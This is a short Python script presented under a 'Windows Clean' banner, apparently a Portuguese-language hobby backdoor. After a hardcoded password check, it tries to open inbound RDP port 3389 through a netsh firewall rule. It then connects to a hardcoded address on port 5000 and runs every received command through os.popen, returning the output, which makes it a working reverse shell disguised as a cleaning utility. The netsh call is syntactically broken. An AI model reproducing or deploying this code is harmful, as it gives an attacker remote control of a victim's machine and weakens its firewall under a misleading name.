import os,sys
import socket
import subprocess

banner = ('''
__        ___           _                      ____ _
\ \      / (_)_ __   __| | _____      _____   / ___| | ___  __ _ _ __
 \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __| | |   | |/ _ \/ _` | '_ \
  \ V  V / | | | | | (_| | (_) \ V  V /\__ \ | |___| |  __/ (_| | | | |
   \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/  \____|_|\___|\__,_|_| |_|
   ''')
print(banner)
print ("-----------------------------------------------------------------")
print ("[+] Version 1.0 [+] Keidi Francis [+] Use for good please")
print ("-----------------------------------------------------------------")

secret = "lopes"
login = input(str("Digite a senha: "))
#os.getlogin()
if login == secret:
       
        part = "ALLOW TCP PORT 3389"
        #os.system("netsh.exe delete rules ")
        subprocess.run("netsh.exe advfirewall firewall add rule name=",ALLOW TCP PORT 3389," dir=in action=allow protocol=TCP localhost=3389")
        
        host = "192.168.2.128"
        port = 5000
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        while True:
                cmd = s.recv(1024).decode()
                for comando in os.popen(cmd):
                        s.send(comando.encode())

else:
        print ("---------------------------------------------------")
        print ("\t\t[!] Incorreto Por favor nao tente mais - John")
        print ("---------------------------------------------------")

